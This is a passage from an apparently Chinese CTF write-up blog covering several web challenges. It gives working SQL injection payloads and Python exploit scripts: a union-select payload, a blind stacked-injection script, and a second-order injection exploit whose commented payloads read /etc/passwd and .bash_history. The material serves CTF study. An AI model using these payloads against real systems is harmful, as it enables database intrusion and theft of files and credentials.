<span class="keyword">if</span> (!in_array($path_parts[<span class="string">"extension"</span>], <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"zip"</span>, <span class="string">"txt"</span>))) &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">"error extension"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		$path_parts[<span class="string">"extension"</span>] = <span class="string">"."</span> . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line"></span><br><span class="line">		$name = $path_parts[<span class="string">"filename"</span>] . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// $path_parts["filename"] = $db-&gt;quote($path_parts["filename"]);</span></span><br><span class="line">		<span class="comment">// Fix</span></span><br><span class="line">		$path_parts[<span class="string">'filename'</span>] = addslashes($path_parts[<span class="string">'filename'</span>]);</span><br><span class="line"></span><br><span class="line">		$sql = <span class="string">"select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'"</span>;</span><br><span class="line"></span><br><span class="line">		$fetch = $db-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ($fetch-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">"file is exists"</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (move_uploaded_file($file[<span class="string">"tmp_name"</span>], UPLOAD_DIR . $name)) &#123;</span><br><span class="line"></span><br><span class="line">			$sql = <span class="string">"insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')"</span>;</span><br><span class="line">			$re = $db-&gt;query($sql);</span><br><span class="line">			<span class="keyword">if</span> (!$re) &#123;</span><br><span class="line">				print_r($db-&gt;error);</span><br><span class="line">				<span class="keyword">exit</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			$url = <span class="string">"/"</span> . UPLOAD_DIR . $name;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"Your file is upload, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">"upload error"</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		print_r(error_get_last());</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// rename.php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($req[<span class="string">'oldname'</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">'newname'</span>])) &#123;</span><br><span class="line">	$result = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$req['oldname']&#125;'"</span>);</span><br><span class="line">	<span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		$result = $result-&gt;fetch_assoc();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">"old file doesn't exists!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($result) &#123;</span><br><span class="line"></span><br><span class="line">		$req[<span class="string">'newname'</span>] = basename($req[<span class="string">'newname'</span>]);</span><br><span class="line">		$re = $db-&gt;query(<span class="string">"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"</span>);</span><br><span class="line">		<span class="keyword">if</span> (!$re) &#123;</span><br><span class="line">			print_r($db-&gt;error);</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$oldname = UPLOAD_DIR . $result[<span class="string">"filename"</span>] . $result[<span class="string">"extension"</span>];</span><br><span class="line">		$newname = UPLOAD_DIR . $req[<span class="string">"newname"</span>] . $result[<span class="string">"extension"</span>];</span><br><span class="line">		<span class="keyword">if</span> (file_exists($oldname)) &#123;</span><br><span class="line">			rename($oldname, $newname);</span><br><span class="line">		&#125;</span><br><span class="line">		$url = <span class="string">"/"</span> . $newname;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>文件上传的时候都经过了addslash, 改名字阶段从数据库中取出原本的数据不经过addslashes后直接拼进了查询语句中, 导致二次注入.</p>
<p>改名操作是新文件名和原文件扩展名拼接, 可以在二次注入的时候将原文件扩展名置空, 这样数据库中二次注入完之后就filename=x.jpg, extension=’’, 这样就可以直接上传x.jpg后改名成php了.</p>
<h2 id="facebook-ctf-2019-product-manager">facebook ctf 2019 product manager</h2>
<p>buu上的这题有点问题, 没有flag. 所以自己起了一个然后复现, 主界面如下</p>
<p><img src="C:%5CUsers%5Cch4ser__%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191216152057800.png" alt="image-20191216152057800"></p>
<p>关键代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">CREATE TABLE products (</span></span><br><span class="line"><span class="comment">  name char(64),</span></span><br><span class="line"><span class="comment">  secret char(64),</span></span><br><span class="line"><span class="comment">  description varchar(250)</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('facebook', sha256(....), 'FLAG_HERE');</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('messenger', sha256(....), ....);</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('instagram', sha256(....), ....);</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('whatsapp', sha256(....), ....);</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('oculus-rift', sha256(....), ....);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    ...... </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_product</span><span class="params">($name)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $db;</span><br><span class="line">  $statement = $db-&gt;prepare(</span><br><span class="line">    <span class="string">"SELECT name, description FROM products WHERE name = ?"</span></span><br><span class="line">  );</span><br><span class="line">  check_errors($statement);</span><br><span class="line">  $statement-&gt;bind_param(<span class="string">"s"</span>, $name);</span><br><span class="line">  check_errors($statement-&gt;execute());</span><br><span class="line">  $res = $statement-&gt;get_result();</span><br><span class="line">  check_errors($res);</span><br><span class="line">  $product = $res-&gt;fetch_assoc();</span><br><span class="line">  $statement-&gt;close();</span><br><span class="line">  <span class="keyword">return</span> $product;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>flag在facebook项中, 同时, 代码逻辑不允许插入同名项, 但是get_product仅仅从名字来选择项, 但是select 的特性是忽略末尾的空格, 如果插入一条名字叫做<code>facebook      {几个空格}</code>的项目的话, 在查询<code>Facebook</code>, 并且用facebook{空格}插入时候的密码来验证的话是可以验证通过的,  结果就会查询出两个, 一个是真正的facebook另一个是我们插入的</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70886814-6344a080-2017-11ea-8a04-415a612ee2ab.png" alt="image"></p>
<p>查询facebook, 密码是一开始的密码</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70886862-82433280-2017-11ea-955d-98e9eccec93b.png" alt="image"></p>
<h2 id="swpuctf-2019-web1">swpuctf 2019 web1</h2>
<p>这题考察二次注入,  题目里面是一个广告发布页面, 点击申请广告后添加标题等广告信息之后回到首页点击广告详情就能触发二次注入漏洞, 一开始申请广告的时候应该是转义之后的字符串被加入数据库中, 第二次给我的感觉是通过id来查询出title然后用没有addslash过的title又去执行了其他sql语句, 或许是查询content和ac? 感觉怪怪的.总之payload如下(22列真的狠).</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70391534-502b4280-1a11-11ea-9761-3c0c2754fb47.png" alt="image"></p>
<p>其实正解是通过sys.schema_index_statistics找到table_name, 然后无列名注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=hhhh&apos;/**/union/**/select/**/1,(select/**/group_concat(q)/**/from/**/(select/**/ 1,2,3&apos;q&apos;/**/union/**/select/**/*/**/from/**/users)m),&apos;222&apos;,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22||&apos;&amp;content=hello&amp;ac=add</span><br></pre></td></tr></table></figure>
<h2 id="swpuctf-2019-web4">swpuctf 2019 web4</h2>
<p>考察堆叠注入,开局登录界面, 让username等于单引号500, 让username等于<code>and'</code> 200, 换成<code>an'</code> 又是500, 可见这个回显不正常, 很有可能是and被过滤了, 再测试一下其他的关键字的确被过滤了很多包括select 和concat, 采用预编译堆叠注入 , 脚本如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line"><span class="comment">#  select case when 1=0 then (exp(~(select 1))) else 1 end;</span></span><br><span class="line"><span class="comment">#  ';set/**/@a=0x73656c6563742063617365207768656e20313d31207468656e2028657870287e2873656c656374203129292920656c7365203120656e643b;prepare/**/kk/**/from/**/@a;execute/**/kk;</span></span><br><span class="line">a = <span class="string">"select case when 1=0 then (exp(~(select 1))) else 1 end;"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(query)</span>:</span></span><br><span class="line">    hex_str = hex(bytes_to_long(query))[:<span class="number">-1</span>]</span><br><span class="line">    stack = <span class="string">"""';set/**/@a=&#123;0&#125;;prepare/**/kk/**/from/**/@a;execute/**/kk;"""</span>.format(hex_str)</span><br><span class="line">    <span class="keyword">return</span> stack</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(stack)</span>:</span></span><br><span class="line">    json_str = &#123;</span><br><span class="line">        <span class="string">"username"</span>:stack,</span><br><span class="line">        <span class="string">"password"</span>:<span class="string">"gg"</span></span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>&#125;</span><br><span class="line">    url = <span class="string">"http://182.92.220.157:11116/index.php?r=Login/Login"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.post(url, data=json.dumps(json_str), headers=headers,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="comment">#  print res.content</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    l_bound = <span class="number">0</span>;h_bound = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> l_bound&lt;=h_bound:</span><br><span class="line">        m_bound = (l_bound + h_bound) / <span class="number">2</span></span><br><span class="line">        <span class="comment">#  query = "select case when ord(substr((select/**/version()),&#123;0&#125;,1))&gt;&#123;1&#125; then (exp(~(select 1))) else 1 end;".format(index, m_bound)</span></span><br><span class="line">        <span class="comment">#  query = "select case when ord(substr((select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns/**/where/**/table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125; then (exp(~(select 1))) else 1 end;".format(index, m_bound)</span></span><br><span class="line">        <span class="comment">#  query = "select case when ord(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'),&#123;0&#125;,1))&gt;&#123;1&#125; then (exp(~(select 1))) else 1 end;".format(index, m_bound)</span></span><br><span class="line">        query = <span class="string">"select case when ord(substr((select/**/group_concat(flag)/**/from/**/flag),&#123;0&#125;,1))&gt;&#123;1&#125; then (exp(~(select 1))) else 1 end;"</span>.format(index, m_bound)</span><br><span class="line">        <span class="comment">#  query = "select case when ord(substr((select 'hello'),&#123;0&#125;,1))&gt;&#123;1&#125; then (exp(~(select 1))) else 1 end;".format(index, m_bound)</span></span><br><span class="line">        <span class="comment">#  print query</span></span><br><span class="line">        stack = generate(query)</span><br><span class="line">        a = send(stack)</span><br><span class="line">        <span class="comment">#  exit(0)</span></span><br><span class="line">        <span class="keyword">if</span> a:</span><br><span class="line">            l_bound = m_bound + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            h_bound = m_bound - <span class="number">1</span></span><br><span class="line">            temp = m_bound</span><br><span class="line"></span><br><span class="line">    result += chr(temp)</span><br><span class="line">    index = index + <span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> result</span><br></pre></td></tr></table></figure>
<p>注入出来一个zip的路径, 获取它之后开始审计代码, 发现extract函数处有变量覆盖漏洞</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70391962-95517380-1a15-11ea-8b9f-7e1d76a23770.png" alt="image"></p>
<p>出来的base64进行一个解码就有flag了</p>
<h2 id="Comment">Comment</h2>
<p>使用这个工具https://github.com/gakki429/Git_Extract 将远程环境中的.git中的对象还原出来, 普通的githack做不到这一点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">'bo_id'</span>]);</span><br><span class="line">    $sql = <span class="string">"select category from board where id='$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">'category'</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=$bo_id"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>category变量在插入之后如果触发了comment功能就会再次提取出来并不做任何处理重新插入新的表中, 那么可以考虑二次注入了(发现很多和插入相关的功能都和二次注入相关)</p>
<p>然后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;insert into comment</span><br><span class="line">        set category = &apos;$category&apos;,</span><br><span class="line">            content = &apos;$content&apos;,</span><br><span class="line">            bo_id = &apos;$bo_id&apos;&quot;;</span><br></pre></td></tr></table></figure>
<p>这种多行的就可以避免注释符号破坏整体结构.于是exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://10a319be-9667-4c10-94ca-bdc272ca247f.node3.buuoj.cn"</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ran_str</span><span class="params">()</span>:</span></span><br><span class="line">    string = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        string += chr(random.randint(ord(<span class="string">'A'</span>), ord(<span class="string">'Z'</span>)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"username"</span>: <span class="string">"zhangwei"</span>,</span><br><span class="line">        <span class="string">"password"</span>: <span class="string">"zhangwei666"</span></span><br><span class="line">    &#125;</span><br><span class="line">    s.post(url + <span class="string">"/login.php"</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(payload)</span>:</span></span><br><span class="line">    ran_string = ran_str()</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'title'</span>: ran_string,</span><br><span class="line">        <span class="string">'category'</span>: <span class="string">"',content=("</span>+payload+<span class="string">"),/*"</span>,</span><br><span class="line">        <span class="string">'content'</span>: <span class="string">'1'</span></span><br><span class="line">    &#125;</span><br><span class="line">    s.post(url + <span class="string">"/write_do.php?do=write"</span>, data=data)</span><br><span class="line">    <span class="keyword">return</span> ran_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment</span><span class="params">(id)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'content'</span>: <span class="string">"*/#"</span>,</span><br><span class="line">        <span class="string">'bo_id'</span>: id</span><br><span class="line">    &#125;</span><br><span class="line">    s.post(url + <span class="string">"/write_do.php?do=comment"</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 读取用户</span></span><br><span class="line">    <span class="comment">#  payload = "select (load_file('/etc/passwd'))"</span></span><br><span class="line">    <span class="comment"># 读取用户目录下的操作历史</span></span><br><span class="line">    <span class="comment"># payload = "select (load_file('/home/www/.bash_history'))"</span></span><br><span class="line">    <span class="comment"># 从操作历史中知道了这么个文件</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># payload = "select (load_file('/tmp/html/.DS_Store'))"</span></span><br><span class="line">    <span class="comment">#  payload = "select (load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    login()</span><br><span class="line">    ran_string = write(payload)</span><br><span class="line">    result = re.search(<span class="string">"&lt;tr&gt;&lt;td&gt;.*&lt;/td&gt;&lt;td class='AutoNewline'&gt;.*&lt;/td&gt;&lt;td class='AutoNewline'&gt;"</span>+ran_string+<span class="string">"&lt;/td&gt;"</span>, s.get(url).text)</span><br><span class="line">    id = str(result.group(<span class="number">0</span>).split(<span class="string">'&lt;/td&gt;'</span>)[<span class="number">0</span>][<span class="number">8</span>:])</span><br><span class="line">    comment(id)</span><br><span class="line">    result = re.split(<span class="string">"&lt;p&gt;"</span>, s.get(url + <span class="string">"/comment.php?id="</span> + str(id)).text)[<span class="number">2</span>]</span><br><span class="line">    content = result[:result.index(<span class="string">'&lt;/p&gt;'</span>)]</span><br><span class="line">    print(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="De1ta-ctf-2019-giftbox">De1ta ctf 2019 giftbox</h2>
<p>打开后是一个漂亮的沙盒</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70123884-86ce2980-16ae-11ea-83e0-367a142a00ad.png" alt="image"></p>
<p>打开main.js后提示使用pyotp库, 是一个一次一密的的东西, 还给了初始化的密钥, 然后初始化pyotp类之后通过时间产生密钥.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">       url: host + &apos;/shell.php?a=&apos;+encodeURIComponent(input)+&apos;&amp;totp=&apos; + new TOTP(&quot;GAXG24JTMZXGKZBU&quot;,8).genOTP(),</span><br><span class="line">       type: &quot;GET&quot;,</span><br><span class="line">       dataType: &apos;json&apos;,</span><br><span class="line">       success: (res) =&gt; &#123;</span><br><span class="line">           e_main.html($(&apos;#main&apos;).html() + &apos;[&lt;span id=&quot;usr&quot;&gt;&apos; + usrName + &apos;&lt;/span&gt;@&lt;span class=&quot;host&quot;&gt;de1ta-mbp&lt;/span&gt; &apos; + position + &apos;]% &apos; + input + &apos;&lt;br/&gt;&apos; + res.message + &apos;&lt;br/&gt;&apos;)</span><br><span class="line">           if (e_console.height()-$(window).height()&gt;0)&#123;e_console.css(&apos;top&apos;,-(e_console.height()-$(window).height()));&#125;else&#123;e_console.css(&apos;top&apos;,5);&#125;</span><br><span class="line">       &#125;,</span><br><span class="line">       error: (res) =&gt; &#123;</span><br><span class="line">           e_main.html($(&apos;#main&apos;).html() + &apos;[&lt;span id=&quot;usr&quot;&gt;&apos; + usrName + &apos;&lt;/span&gt;@&lt;span class=&quot;host&quot;&gt;de1ta-mbp&lt;/span&gt; &apos; + position + &apos;]% &apos; + input + &apos;&lt;br/&gt;System Fatal Error!&lt;br/&gt;&apos;)</span><br><span class="line">           if (e_console.height()-$(window).height()&gt;0)&#123;e_console.css(&apos;top&apos;,-(e_console.height()-$(window).height()));&#125;else&#123;e_console.css(&apos;top&apos;,5);&#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;)</span><br></pre></td></tr></table></figure>
<p>登录处注入脚本</p>
